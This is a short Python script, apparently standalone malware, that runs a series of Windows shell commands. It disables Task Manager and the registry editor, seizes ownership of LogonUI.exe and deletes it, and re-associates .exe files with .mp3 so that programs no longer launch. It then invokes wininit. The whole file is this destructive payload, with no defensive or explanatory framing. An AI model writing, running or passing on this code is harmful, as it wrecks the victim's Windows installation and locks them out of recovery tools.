import os

os.system("reg add hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System /v disabletaskmgr /t REG_DWORD /d 1 /f ")
os.system("takeown /f C:\Windows\System32\LogonUI.exe")
os.system("icacls C:\Windows\System32\LogonUI.exe /grant:r %USERDOMAIN%\%USERNAME%:F /c")
os.system("del C:\Windows\System32\LogonUI.exe /s/q")
os.system("assoc .exe=.mp3")
os.system("REG add  HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f")
os.system("powershell.exe wininit")
